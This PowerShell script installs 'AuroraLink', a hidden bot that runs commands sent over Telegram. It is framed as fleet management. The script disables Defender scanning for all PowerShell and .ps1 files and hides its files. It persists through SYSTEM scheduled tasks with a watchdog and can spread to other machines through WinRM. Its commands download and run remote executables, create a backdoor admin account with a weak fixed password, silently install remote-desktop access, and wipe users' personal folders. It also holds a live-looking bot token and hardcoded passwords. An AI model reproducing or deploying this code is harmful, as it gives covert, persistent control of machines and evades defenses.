# AuroraLink.ps1 - Fleet Telegram Bot Deployer
# Installs to C:\ProgramData\AuroraLink\ (hidden + Defender-excluded)
# Creates \AuroraLink\AuroraCoreSvc + \AuroraLink\AuroraGuardSvc
# Single instance enforced by global mutex

# ===== ELEVATION =====
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

$installDir   = "C:\ProgramData\AuroraLink"
$installPath  = "$installDir\AuroraCore.ps1"
$watchdogPath = "$installDir\AuroraGuard.ps1"
$logPath      = "$installDir\AuroraLink.log"
$taskPath     = "\AuroraLink\"
$mutexName    = "Global\AuroraLink_Core_9F3E"
$guardMutex   = "Global\AuroraLink_RustGuard_9F3E"

# ===== INSTALL DIR =====
if (-not (Test-Path $installDir)) { New-Item -Path $installDir -ItemType Directory -Force | Out-Null }
$fi = Get-Item $installDir -Force
$fi.Attributes = $fi.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System

# ===== DEFENDER EXCLUSION =====
try {
    Add-MpPreference -ExclusionPath $installDir -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionExtension ".ps1" -ErrorAction SilentlyContinue
    Write-Host "[+] Defender exclusion added for $installDir" -ForegroundColor Green
} catch {
    Write-Host "[!] Could not add Defender exclusion: $_" -ForegroundColor Yellow
}

# =====================================================================
# CORE SCRIPT (AuroraCore.ps1)
# =====================================================================
$script = @'
# ===== AUTO ELEVATE =====
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# ===== CONFIG =====
$BOT_TOKEN  = "9176710386:AAEVMRpOI3UwYQG-bcerQ8b08nYehk58EOE"
$CHAT_IDS   = @("6716357143","8546050060")
$RemoteUser = "Administrator"

$DataDir    = Join-Path $env:LOCALAPPDATA "Microsoft\Windows\AuroraLink"
$OffsetFile = Join-Path $DataDir "offset.txt"
$StatusFile = Join-Path $DataDir "core_start.txt"
$HostsFile  = Join-Path $DataDir "hosts.txt"
$CredFile   = Join-Path $DataDir "cred.dat"
if (-not (Test-Path $DataDir)) { New-Item -ItemType Directory -Path $DataDir -Force | Out-Null }
if (-not (Test-Path $StatusFile)) { (Get-Date).ToString("o") | Set-Content -Path $StatusFile -Force }

$computerName = $env:COMPUTERNAME
$script:processedCommands = @{}
$updateMode = $false

# ===== SINGLE INSTANCE =====
$mutex = New-Object System.Threading.Mutex($false, "Global\AuroraLink_Core_9F3E")
if (-not $mutex.WaitOne(0, $false)) { Write-Host "Another instance running. Exiting."; exit }

# ===== NETWORK =====
function Wait-ForNetwork {
    $attempts = 0
    while ($attempts -lt 12) {
        try { $null = Invoke-RestMethod -Uri "https://api.telegram.org" -TimeoutSec 5; return $true }
        catch { $attempts++; Start-Sleep -Seconds 5 }
    }
    return $false
}
if (-not (Wait-ForNetwork)) { Write-Host "Network unavailable"; $mutex.ReleaseMutex(); exit }

# ===== POLICY =====
function Set-PowerShellPolicy {
    try {
        Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue
        Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force -ErrorAction SilentlyContinue
        try { Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine -Force -ErrorAction SilentlyContinue } catch {}
        $env:POWERSHELL_TELEMETRY_OPTOUT = 1
        $env:POWERSHELL_UPDATECHECK = 'Off'
        $PSDefaultParameterValues['*:Confirm'] = $false
        $PSDefaultParameterValues['*:Force']   = $true
    } catch {}
}
Set-PowerShellPolicy

# ===== HELPERS =====
function Send($text, $replyToMessageId = $null, $chat = $null) {
    if ($CHAT_IDS -notcontains $chat) { $chat = $CHAT_IDS[0] }
    if ([string]::IsNullOrWhiteSpace($text)) { $text = "(no output)" }
    if ($text.Length -gt 3800) { $text = $text.Substring(0,3800) + "`n... (truncated)" }
    $body = @{ chat_id = $chat; text = "[$computerName]`n$text" }
    if ($replyToMessageId) { $body.reply_to_message_id = $replyToMessageId }
    $retry = 0
    do {
        try {
            Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -Method Post -Body $body -TimeoutSec 10 -ErrorAction Stop | Out-Null
            return
        } catch { $retry++; if ($retry -lt 3) { Start-Sleep -Seconds 2 } }
    } while ($retry -lt 3)
}

function GetUpdates {
    try {
        $off = 0
        if (Test-Path $OffsetFile) { $off = [long](Get-Content $OffsetFile -Raw).Trim() }
        return Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=$off&timeout=25" -TimeoutSec 40
    } catch { return $null }
}
function Set-Offset($v) { try { Set-Content -Path $OffsetFile -Value $v -Force } catch {} }

function DownloadFile($file_id, $savePath) {
    try {
        $file = Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/getFile?file_id=$file_id"
        $url  = "https://api.telegram.org/file/bot$BOT_TOKEN/$($file.result.file_path)"
        Invoke-WebRequest $url -OutFile $savePath
        return $true
    } catch { return $false }
}

function Resolve-Command($text) {
    if ($text -match '^@(\S+)\s+(.+)$') {
        $target = $matches[1]; $cmd = $matches[2]
        if ($target -in @('all','broadcast','everyone')) { return @{ Target = 'all'; Cmd = $cmd } }
        if ($target -ieq $computerName) { return @{ Target = $computerName; Cmd = $cmd } }
        return $null
    }
    if ($text -match '^/(\S+)\s+(.+)$') {
        return @{ Target = $matches[2].Trim(); Cmd = "/$($matches[1])" }
    }
    return @{ Target = $null; Cmd = $text }
}

function IsCommandProcessed($messageId, $cmd) {
    $key = "$messageId`_$cmd"
    if ($script:processedCommands.ContainsKey($key)) { return $true }
    $script:processedCommands[$key] = $true
    if ($script:processedCommands.Count -gt 200) {
        $script:processedCommands.Keys | Select-Object -First 100 | ForEach-Object { $script:processedCommands.Remove($_) }
    }
    return $false
}

function Run-PS([string]$script, [int]$TimeoutSeconds = 60) {
    try {
        $tag = [guid]::NewGuid().ToString("N")
        $ps1 = Join-Path $env:TEMP "al_$tag.ps1"
        $out = Join-Path $env:TEMP "al_$tag.txt"
        $err = Join-Path $env:TEMP "al_$tag.err"
        [IO.File]::WriteAllText($ps1, $script, (New-Object System.Text.UTF8Encoding($false)))
        $proc = Start-Process -FilePath "powershell.exe" -ArgumentList @("-NoProfile","-ExecutionPolicy","Bypass","-File","`"$ps1`"") -RedirectStandardOutput $out -RedirectStandardError $err -WindowStyle Hidden -PassThru
        $waited = 0
        while (-not $proc.HasExited -and $waited -lt $TimeoutSeconds) { Start-Sleep -Milliseconds 500; $waited += 0.5 }
        if (-not $proc.HasExited) {
            try { & taskkill /F /T /PID $proc.Id 2>$null | Out-Null } catch {}
            Start-Sleep -Milliseconds 500
            $o1 = if (Test-Path $out) { Get-Content $out -Raw } else { '' }
            $o2 = if (Test-Path $err) { Get-Content $err -Raw } else { '' }
            Remove-Item $ps1,$out,$err -Force -EA 0
            $p = ("$o1`n$o2").Trim(); if ($p.Length -gt 3000) { $p = $p.Substring(0,3000) }
            return "TIMEOUT after ${TimeoutSeconds}s. Partial:`n" + $(if ($p) { $p } else { '(none)' })
        }
        $o1 = if (Test-Path $out) { Get-Content $out -Raw } else { '' }
        $o2 = if (Test-Path $err) { Get-Content $err -Raw } else { '' }
        Remove-Item $ps1,$out,$err -Force -EA 0
        $all = ("$o1`n$o2").Trim()
        if ($all.Length -gt 3500) { $all = $all.Substring(0,3500) }
        if (-not $all) { return "(no output)" }
        return $all
    } catch { return "ERR: $_" }
}

function Get-Cred {
    if (-not $RemoteUser) { return $null }
    if (-not (Test-Path $CredFile)) { return $null }
    try {
        $sec = Get-Content $CredFile | ConvertTo-SecureString
        return New-Object System.Management.Automation.PSCredential($RemoteUser, $sec)
    } catch { return $null }
}

function Invoke-RemoteScript([string]$target, [string]$scriptText) {
    if ($target -ieq $env:COMPUTERNAME -or $target -in @('127.0.0.1','localhost')) { return (Run-PS $scriptText) }
    $cred = Get-Cred; $hasCred = [bool]$cred
    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptText))
    $winrmUp = $false
    try { $winrmUp = [bool](Test-WSMan -ComputerName $target -ErrorAction Stop) } catch {}
    if (-not $winrmUp) { return "ERR: cannot reach WinRM on $target (offline, WinRM disabled, or firewall blocks 5985)" }
    $isDomain = $false; try { $isDomain = [bool](Get-ADDomain -ErrorAction Stop) } catch {}
    if (-not $hasCred -and -not $isDomain) { return "ERR: $target is WORKGROUP and no cred.dat exists. Create cred.dat as SYSTEM on this relay." }

    $snippet = @"
try {
    `$s = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('$b64'))
    `$params = @{
        ComputerName = '$target'
        ScriptBlock  = { param(`$x) try { Invoke-Expression `$x } catch { 'ERR: ' + `$_ } }
        ArgumentList = @(`$s)
        ErrorAction  = 'Stop'
    }
    if ($([int]$hasCred)) {
        `$sec = Get-Content '$CredFile' | ConvertTo-SecureString
        `$params.Credential = New-Object System.Management.Automation.PSCredential('$RemoteUser', `$sec)
        `$params.Authentication = 'Negotiate'
    }
    `$r = Invoke-Command @params 2>&1 | Out-String
    if ([string]::IsNullOrWhiteSpace(`$r)) { '(no output)' } else { `$r.Trim() }
} catch { 'ERR: ' + `$_ }
"@
    $res = Run-PS $snippet -TimeoutSeconds 60
    if ([string]::IsNullOrWhiteSpace($res)) { $res = "(no output)" }
    return $res
}

function Get-Targets {
    if (-not (Test-Path $HostsFile)) { return @() }
    Get-Content $HostsFile | ForEach-Object { $l = $_.Trim(); if ($l -and -not $l.StartsWith('#')) { $l } } | Where-Object { $_ -and ($_ -ine $env:COMPUTERNAME) }
}

function Get-LocalStatusReport {
    $now = Get-Date; $os = Get-CimInstance Win32_OperatingSystem -EA 0
    $lb = if ($os) { $os.LastBootUpTime } else { $now }; $up = $now - $lb
    $ips = Get-NetIPAddress -AddressFamily IPv4 -EA 0 | Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' } | Select-Object -ExpandProperty IPAddress -Unique
    $pub = 'n/a'; try { $pub = (Invoke-RestMethod 'https://api.ipify.org?format=json' -TimeoutSec 4).ip } catch {}
    $au = 'n/a'; try { if (Test-Path $StatusFile) { $s=[datetime]::Parse((Get-Content $StatusFile -Raw).Trim()); $d=$now-$s; $au='{0}d {1}h {2}m' -f $d.Days,$d.Hours,$d.Minutes } } catch {}
    $dfc1='C:\Windows\SysWOW64\DFC.exe'; $dfc2='C:\Windows\System32\DFC.exe'
    $ds = if ((Test-Path $dfc1) -or (Test-Path $dfc2)) { 'present' } else { 'missing' }
    $rs = (Get-Service rustdesk -EA 0).Status; if (-not $rs) { $rs='not installed' }
    $aa='absent'; $u=Get-LocalUser 'aadmin' -EA 0
    if ($u) { $aa = if ($u.Enabled) { 'exists (enabled)' } else { 'exists (disabled)' } }
    @(
        "[ONLINE] $env:COMPUTERNAME",
        "User: $env:USERDOMAIN\$env:USERNAME",
        "OS: $($os.Caption) ($($os.Version))",
        ('Uptime: {0}d {1}h {2}m' -f $up.Days,$up.Hours,$up.Minutes),
        "Core up: $au",
        "LAN IP: $($ips -join ', ')",
        "Public IP: $pub",
        "RustDesk svc: $rs",
        "DFC: $ds",
        "aadmin: $aa",
        "Checked: $($now.ToString('yyyy-MM-dd HH:mm:ss'))"
    ) -join "`n"
}

$ScriptInstallDF = '$url="https://github.com/asnake-wian/deploy/raw/refs/heads/main/DF.exe"; $out="$env:TEMP\DF.exe"; Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing; Start-Process -FilePath $out -ArgumentList "/Install" -Wait; Restart-Computer -Force'

$ScriptCreateAadmin = @'
try {
    $u="aadmin"; $p="8100"
    $user = Get-LocalUser $u -ErrorAction SilentlyContinue
    if ($user) {
        if (-not $user.Enabled) { Enable-LocalUser $u; $msg = "Enabled existing user $u" }
        else                    { $msg = "User $u already exists (enabled)" }
    } else {
        New-LocalUser $u -Password (ConvertTo-SecureString $p -AsPlainText -Force) -PasswordNeverExpires -ErrorAction Stop | Out-Null
        $msg = "Created user $u (pw: $p)"
    }
    Add-LocalGroupMember -Group Administrators -Member $u -ErrorAction SilentlyContinue
    $inAdmin = (Get-LocalGroupMember -Group Administrators -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "\\$u$" })
    if ($inAdmin) { $msg += " + Administrators" } else { $msg += " (NOT in Administrators)" }
    $msg
} catch { "ERR: $_" }
'@

$ScriptRemoveAadmin = @'
try {
    $u="aadmin"
    if (Get-LocalUser $u -ErrorAction SilentlyContinue) {
        Disable-LocalUser $u -ErrorAction SilentlyContinue
        Remove-LocalGroupMember -Group Administrators -Member $u -ErrorAction SilentlyContinue
        Remove-LocalUser $u -ErrorAction SilentlyContinue
        "Removed user $u"
    } else { "User $u not found" }
} catch { "ERR: $_" }
'@

$ScriptThawed = 'try { $dfc="C:\Windows\SysWOW64\DFC.exe"; if(!(Test-Path $dfc)){$dfc="C:\Windows\System32\DFC.exe"}; if(Test-Path $dfc){ (& $dfc "Abel@101" /BOOTTHAWED 2>&1 | Out-String).Trim() } else { "DFC_NOT_FOUND" } } catch { "ERR: $_" }'
$ScriptFrozen = 'try { $dfc="C:\Windows\SysWOW64\DFC.exe"; if(!(Test-Path $dfc)){$dfc="C:\Windows\System32\DFC.exe"}; if(Test-Path $dfc){ (& $dfc "Abel@101" /BOOTFROZEN 2>&1 | Out-String).Trim() } else { "DFC_NOT_FOUND" } } catch { "ERR: $_" }'

$ScriptInstallRust = @'
try {
    $mtx = New-Object System.Threading.Mutex($false, 'Global\AuroraLink_RustGuard_9F3E')
    if (-not $mtx.WaitOne(0, $false)) { return 'already running (another install in progress)' }
    try {
        $rd='C:\Program Files\RustDesk\RustDesk.exe'; $cfg='C:\ProgramData\RustDesk\config\RustDesk2.toml'
        if ((Test-Path $rd) -and (Test-Path $cfg)) {
            $tmp=Join-Path $env:TEMP ("ali_"+[guid]::NewGuid().ToString('N')+'.txt'); & $rd --get-id *> $tmp
            $id=(Get-Content $tmp -Raw -EA 0); Remove-Item $tmp -Force -EA 0
            $id=if($id){$id.Trim()}else{''}; if($id -match '(\d{6,})'){$id=$matches[1]}else{$id='ID_NOT_FOUND'}
            return "already installed -> IDF03: $id`nPW: Abel@123"
        }
        taskkill /F /IM RustDesk.exe /T 2>$null | Out-Null
        taskkill /F /IM rustdesk.exe /T 2>$null | Out-Null
        Start-Sleep -Seconds 1
        $exe = Join-Path $env:TEMP 'rd_installer.exe'
        if (Test-Path $exe) { Remove-Item $exe -Force -EA 0 }
        Invoke-WebRequest 'https://github.com/rustdesk/rustdesk/releases/download/1.3.7/rustdesk-1.3.7-x86_64.exe' -OutFile $exe -UseBasicParsing -TimeoutSec 120
        if (-not (Test-Path $exe)) { return 'download failed' }
        $inst = Start-Process -FilePath $exe -ArgumentList @('--silent-install','--install-service','--no-shortcut','--disable-printer','--password','Abel@123') -PassThru -WindowStyle Hidden
        if (-not $inst.WaitForExit(120000)) { try { taskkill /F /T /PID $inst.Id 2>$null | Out-Null } catch {}; return 'installer timed out' }
        if ($inst.ExitCode -ne 0) { return "installer exit: $($inst.ExitCode)" }
        Remove-Item $exe -Force -EA 0
        foreach ($p in @("$env:PUBLIC\Desktop\RustDesk.lnk","$env:PUBLIC\Desktop\RustDesk (1).lnk","$env:PUBLIC\Desktop\RustDesk Installer.lnk","$env:ProgramData\Microsoft\Windows\Start Menu\Programs\RustDesk.lnk","$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\RustDesk.lnk")) { Remove-Item $p -Force -EA 0 }
        if (-not (Test-Path $rd)) { return 'installer done but RustDesk.exe not found' }
        netsh advfirewall firewall delete rule name=RustDeskSvc 2>$null | Out-Null
        netsh advfirewall firewall add rule name=RustDeskSvc dir=in action=allow program="$rd" enable=yes profile=any 2>$null | Out-Null
        sc.exe start rustdesk 2>$null | Out-Null; Start-Sleep -Seconds 3
        $tmp=Join-Path $env:TEMP ("ali_"+[guid]::NewGuid().ToString('N')+'.txt'); & $rd --get-id *> $tmp
        $id=(Get-Content $tmp -Raw -EA 0); Remove-Item $tmp -Force -EA 0
        $id=if($id){$id.Trim()}else{''}; if($id -match '(\d{6,})'){$id=$matches[1]}else{$id='ID_NOT_FOUND'}
        $pwSet = Test-Path $cfg
        return ("IDF03: $id`nPW: Abel@123`nConfig: $(if($pwSet){'present'}else{'MISSING'})")
    } finally { try { $mtx.ReleaseMutex() } catch {} }
} catch { return "ERR: $_" }
'@

$ScriptUninstallRust = @'
try {
    taskkill /F /IM RustDesk.exe /T 2>$null | Out-Null
    sc.exe stop rustdesk 2>$null | Out-Null
    sc.exe delete rustdesk 2>$null | Out-Null
    $up=@("$env:ProgramFiles\RustDesk\uninstall.exe","${env:ProgramFiles(x86)}\RustDesk\uninstall.exe","$env:LOCALAPPDATA\Programs\RustDesk\uninstall.exe","$env:APPDATA\RustDesk\uninstall.exe")
    $u=$up|Where-Object{Test-Path $_}|Select-Object -First 1
    if ($u) { Start-Process $u -ArgumentList '/S' -Wait -EA 0; 'uninstalled' } else { 'uninstaller not found' }
} catch { "ERR: $_" }
'@

$ScriptUninstallOld = '$u="https://github.com/asnake-wian/deploy/raw/refs/heads/main/DFStd.exe";$o="$env:TEMP\DFStd.exe";Invoke-WebRequest -Uri $u -OutFile $o;Start-Process -FilePath $o -ArgumentList "/Uninstall" -Wait'

$ScriptReset = '$e=@("This PC.lnk","Recycle Bin.lnk","Microsoft Edge.lnk","Google Chrome.lnk","WPS PDF.lnk","WPS Office.lnk","Safe Exam Browser.lnk"); Get-ChildItem "C:\Users" -Directory -EA 0 | Where-Object { $_.Name -notin @("Public","Default","Default User","All Users") -and (Test-Path "$($_.FullName)\Desktop") } | ForEach-Object { $u=$_.FullName; Get-ChildItem (Join-Path $u "Desktop") -Force -EA 0 | Where-Object { $_.Name -notin $e } | Remove-Item -Recurse -Force -EA 0; foreach($f in @("Downloads","Pictures","Documents","Videos")){ $p=Join-Path $u $f; if(Test-Path $p){ Get-ChildItem $p -Force -EA 0 | Remove-Item -Recurse -Force -EA 0 } } }; Get-ChildItem "C:\Users\Public\Desktop" -Force -EA 0 | Where-Object { $_.Name -match "RustDesk" } | Remove-Item -Recurse -Force -EA 0; Clear-RecycleBin -Force -EA 0'

$ScriptID = @'
try {
    $rp = @('C:\Program Files\RustDesk\rustdesk.exe','C:\Program Files (x86)\RustDesk\rustdesk.exe','C:\Program Files\SafeExamBrowser\Application\locales\RustDesk\rustdesk.exe',"$env:LOCALAPPDATA\RustDesk\rustdesk.exe")
    $p=$null; foreach ($x in $rp) { if (Test-Path $x) { $p=$x; break } }
    if (-not $p) { return 'RUSTDESK_NOT_FOUND' }
    $tmp=Join-Path $env:TEMP ("ali_"+[guid]::NewGuid().ToString('N')+'.txt'); & $p --get-id *> $tmp
    $id=(Get-Content $tmp -Raw -EA 0); Remove-Item $tmp -Force -EA 0
    $id=if($id){$id.Trim()}else{''}; if($id -match '(\d{6,})'){$id=$matches[1]}else{$id='ID_NOT_FOUND'}
    return "IDF03: $id`nPW: Abel@123"
} catch { return "ERR: $_" }
'@

Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 5)
Send "AuroraLink core started on $computerName"

$consecutiveErrors = 0
while ($true) {
    try {
        $updates = GetUpdates
        if ($updates -and $updates.result) {
            $consecutiveErrors = 0
            foreach ($u in $updates.result) {
                Set-Offset ($u.update_id + 1)
                if (-not $u.message) { continue }
                $cid = "$($u.message.chat.id)"
                if ($CHAT_IDS -notcontains $cid) { continue }
                $mid = $u.message.message_id
                $txt = "$($u.message.text)".Trim()

                if ($updateMode -and $u.message.document) {
                    $fn = $u.message.document.file_name
                    if ($fn -like "*.ps1") {
                        $newPath = "$env:TEMP\aurora_update_$([Guid]::NewGuid()).ps1"
                        if (DownloadFile $u.message.document.file_id $newPath) {
                            Send "Updating $computerName..." $mid $cid
                            Copy-Item $PSCommandPath "$PSCommandPath.backup" -Force -EA 0
                            Copy-Item $newPath $PSCommandPath -Force
                            Remove-Item $newPath -Force -EA 0
                            Send "$computerName updated. Restarting..." $mid $cid
                            Start-Sleep 2; $mutex.ReleaseMutex()
                            Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
                            exit
                        } else { Send "Failed to download file" $mid $cid }
                    } else { Send "Please send a .ps1 file" $mid $cid }
                    $updateMode = $false
                    continue
                }

                if (-not $txt) { continue }

                $parsed = Resolve-Command $txt
                if (-not $parsed) { continue }
                $cmd = $parsed.Cmd
                if (IsCommandProcessed $mid $cmd) { continue }

                if ($cmd -eq "/update") {
                    $updateMode = $true
                    Send "Update mode activated. Send new .ps1 file." $mid $cid
                    continue
                }

                if ($cmd -match '^/status\b') {
                    $arg = $parsed.Target
                    if (-not $arg -or $arg -ieq $computerName) {
                        Send (Get-LocalStatusReport) $mid $cid
                    } else {
                        $r = Invoke-RemoteScript $arg 'try { $now=Get-Date; $os=Get-CimInstance Win32_OperatingSystem -EA 0; $ub=$os.LastBootUpTime; $up=$now-$ub; $ips=(Get-NetIPAddress -AddressFamily IPv4 -EA 0|Where-Object{$_.IPAddress -notlike "127.*" -and $_.IPAddress -notlike "169.254.*"}|Select-Object -ExpandProperty IPAddress -Unique) -join ", "; "[ONLINE] $env:COMPUTERNAME`nUser: $env:USERDOMAIN\$env:USERNAME`nOS: $($os.Caption) ($($os.Version))`nUptime: {0}d {1}h {2}m`nLAN IP: $ips" -f $up.Days,$up.Hours,$up.Minutes } catch { "ERR: $_" }'
                        Send ("STATUS -> $arg`n$r") $mid $cid
                    }
                    continue
                }

                if ($cmd -match '^/ID\b') { Send (Run-PS $ScriptID) $mid $cid; continue }

                if ($cmd -match '^/InstallDF(?:\s+(.+))?$') {
                    $tg = if ($matches[1]) { $matches[1].Trim() } else { $computerName }
                    if ($tg -ieq 'all') {
                        $targets = Get-Targets
                        if (-not $targets) { Send "No hosts.txt entries." $mid $cid; continue }
                        $out = @("Local: " + (Run-PS $ScriptInstallDF))
                        foreach ($h in $targets) { $out += "$h : " + (Invoke-RemoteScript $h $ScriptInstallDF) }
                        Send ("InstallDF ALL`n" + ($out -join "`n")) $mid $cid
                    } else { Send ("InstallDF -> $tg`n" + (Invoke-RemoteScript $tg $ScriptInstallDF)) $mid $cid }
                    continue
                }

                if ($cmd -match '^/aadmin(?:\s+(.+))?$') {
                    $tg = if ($matches[1]) { $matches[1].Trim() } else { $computerName }
                    if ($tg -ieq 'all') {
                        $targets = Get-Targets
                        if (-not $targets) { Send "No hosts.txt entries." $mid $cid; continue }
                        $out = @("Local: " + (Run-PS $ScriptCreateAadmin))
                        foreach ($h in $targets) { $out += "$h : " + (Invoke-RemoteScript $h $ScriptCreateAadmin) }
                        Send ("aadmin ALL`n" + ($out -join "`n")) $mid $cid
                    } else { Send ("aadmin -> $tg`n" + (Invoke-RemoteScript $tg $ScriptCreateAadmin)) $mid $cid }
                    continue
                }

                if ($cmd -match '^/RemoveAadmin\b') { Send ("RemoveAadmin -> " + (Run-PS $ScriptRemoveAadmin)) $mid $cid; continue }
                if ($cmd -match '^/Thawed\b')       { Send ("Thawed -> " + (Run-PS $ScriptThawed)) $mid $cid; continue }
                if ($cmd -match '^/Froozen\b')      { Send ("Frozen -> " + (Run-PS $ScriptFrozen)) $mid $cid; continue }

                if ($cmd -match '^/InstallRust\b') {
                    Send 'InstallRust started...' $mid $cid
                    Send (Run-PS $ScriptInstallRust -TimeoutSeconds 150) $mid $cid
                    continue
                }

                if ($cmd -match '^/UninstallRust\b') { Send ("UninstallRust -> " + (Run-PS $ScriptUninstallRust)) $mid $cid; continue }
                if ($cmd -match '^/UninstallOld\b')  { Run-PS $ScriptUninstallOld | Out-Null; Send 'UninstallOld done.' $mid $cid; continue }
                if ($cmd -match '^/Reset\b')         { Run-PS $ScriptReset        | Out-Null; Send "Reset done on $env:COMPUTERNAME" $mid $cid; continue }

                Send "Unknown: $txt" $mid $cid
            }
        }
    } catch {
        $consecutiveErrors++
        Write-Host "Error in main loop: $_"
        Start-Sleep (if ($consecutiveErrors -gt 5) { 30 } else { 10 })
    }
    Start-Sleep (Get-Random -Minimum 1 -Maximum 3)
}
$mutex.ReleaseMutex()
'@

Set-Content -Path $installPath -Value $script -Force
(Get-Item $installPath -Force).Attributes = 'Hidden','System'

# ===== KILL OLD =====
Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -like "*AuroraCore.ps1*" } |
    ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
Start-Sleep -Seconds 2

# =====================================================================
# WATCHDOG (AuroraGuard.ps1)
# =====================================================================
$watchdogScript = @"
# AuroraGuard: ensures AuroraCore is running (exactly one instance)
`$coreFile = "$installPath"
`$instances = @(Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
    Where-Object { `$_.CommandLine -like "*AuroraCore.ps1*" })

if (`$instances.Count -eq 0) {
    Start-Process powershell "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"`$coreFile`"" -WindowStyle Hidden
}
elseif (`$instances.Count -gt 1) {
    `$sorted = `$instances | Sort-Object CreationDate -Descending
    `$sorted | Select-Object -Skip 1 | ForEach-Object { Stop-Process -Id `$_.ProcessId -Force -ErrorAction SilentlyContinue }
}
"@

Set-Content -Path $watchdogPath -Value $watchdogScript -Force
(Get-Item $watchdogPath -Force).Attributes = 'Hidden','System'

# =====================================================================
# SCHEDULED TASKS
# =====================================================================
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$installPath`""

$watchdogAction = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watchdogPath`""

$settings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable `
    -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 999 `
    -ExecutionTimeLimit (New-TimeSpan -Days 0) -MultipleInstances IgnoreNew `
    -DontStopOnIdleEnd -Priority 4

$watchdogSettings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable `
    -ExecutionTimeLimit (New-TimeSpan -Minutes 2) -MultipleInstances IgnoreNew

$triggerStartup = New-ScheduledTaskTrigger -AtStartup
$triggerStartup.Delay = "PT30S"
$triggerLogon = New-ScheduledTaskTrigger -AtLogOn
$triggerRepeat = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(2) `
    -RepetitionInterval (New-TimeSpan -Minutes 15) -RepetitionDuration (New-TimeSpan -Days 3650)

$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName "AuroraCoreSvc" -TaskPath $taskPath `
    -Action $action -Trigger @($triggerStartup,$triggerLogon,$triggerRepeat) `
    -Settings $settings -Principal $principal `
    -Description "AuroraLink core. Infinite runtime. Single instance enforced by mutex." `
    -Force | Out-Null

$watchdogTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) `
    -RepetitionInterval (New-TimeSpan -Minutes 2) -RepetitionDuration (New-TimeSpan -Days 3650)

Register-ScheduledTask -TaskName "AuroraGuardSvc" -TaskPath $taskPath `
    -Action $watchdogAction -Trigger $watchdogTrigger `
    -Settings $watchdogSettings -Principal $principal `
    -Description "AuroraLink guard: starts core if missing; kills duplicates." `
    -Force | Out-Null

# =====================================================================
# START NOW
# =====================================================================
Start-Process powershell "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$installPath`"" -WindowStyle Hidden
Start-ScheduledTask -TaskName "AuroraCoreSvc"  -TaskPath $taskPath -ErrorAction SilentlyContinue
Start-ScheduledTask -TaskName "AuroraGuardSvc" -TaskPath $taskPath -ErrorAction SilentlyContinue

# =====================================================================
# SUMMARY
# =====================================================================
Write-Host "==========================================" -ForegroundColor Green
Write-Host " AuroraLink deployed on $env:COMPUTERNAME" -ForegroundColor Green
Write-Host " Install dir : $installDir (Hidden+System)" -ForegroundColor Green
Write-Host " Core        : $installPath" -ForegroundColor Green
Write-Host " Guard       : $watchdogPath" -ForegroundColor Green
Write-Host " Defender    : $installDir excluded" -ForegroundColor Green
Write-Host " Tasks       : \AuroraLink\AuroraCoreSvc" -ForegroundColor Green
Write-Host "               \AuroraLink\AuroraGuardSvc" -ForegroundColor Green
Write-Host " Runtime     : INFINITE (no ExecutionTimeLimit)" -ForegroundColor Green
Write-Host " Instances   : single via Global\AuroraLink_Core_9F3E" -ForegroundColor Green
Write-Host "==========================================" -ForegroundColor Green
